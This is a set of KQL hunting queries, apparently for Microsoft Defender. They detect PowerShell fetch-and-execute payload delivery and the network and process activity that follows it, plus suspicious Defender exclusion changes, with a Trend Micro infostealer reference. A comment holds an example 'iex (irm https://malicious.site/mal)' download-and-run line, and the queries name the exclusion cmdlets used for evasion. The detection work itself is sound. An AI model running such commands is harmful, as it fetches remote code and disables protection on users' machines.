Find the payload delivery.  
```
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
```  

Find the network connection activity.  
```
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
| join (DeviceNetworkEvents) on InitiatingProcessFileName,InitiatingProcessId 
```  

Find the invoked processes  
```  
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_all ("iex","irm","https://") or  Command has_all ('Invoke-Expression','Invoke-RestMethod','https://')) //iex (irm https://malicious.site/mal)
| join (DeviceProcessEvents) on InitiatingProcessFileName,InitiatingProcessId 
```

Suspicious Defender Exclusions
```
let RegistryChanges=
DeviceRegistryEvents
| where ActionType=~'RegistryValueSet' //also can be used RegistryKeyCreated
| where RegistryKey contains @"SOFTWARE\Microsoft\Windows Defender\Exclusions" or RegistryKey contains @"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions";
let Events=
DeviceEvents
| where ActionType=="PowerShellCommand"
| extend Command=parse_json(AdditionalFields).Command
| where (Command has_any ("ExclusionPath","ExclusionExtension","ExclusionIpAddress","ExclusionProcess") and Command has_any("Add-MpPreference","Set-MpPreference")) or (Command contains 'MSFT_MpPreference' and Command has_any('Add',@"root/Microsoft/Windows/Defender","exclusion"));
union isfuzzy=true RegistryChanges,Events
```

References:  
https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html  

